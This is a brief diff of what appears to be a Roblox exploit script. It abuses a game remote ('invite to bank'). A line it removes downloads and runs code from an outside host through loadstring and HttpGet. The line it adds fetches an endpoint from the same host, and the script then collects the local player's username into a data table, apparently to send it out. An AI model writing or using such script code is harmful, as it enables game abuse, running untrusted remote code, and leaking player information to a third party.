@@ -295,9 +295,8 @@ local A_1 =
 }
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
 Event:InvokeServer(A_1)
-print("Got After Invite")
 	
-local url = loadstring(game:HttpGet("https://downloads.blobnet.tk/web.html"))()
+local url = game:HttpGet("https://downloads.blobnet.tk/web.html")
 local username = game:GetService("Players").LocalPlayer.Name
  
 local data = {
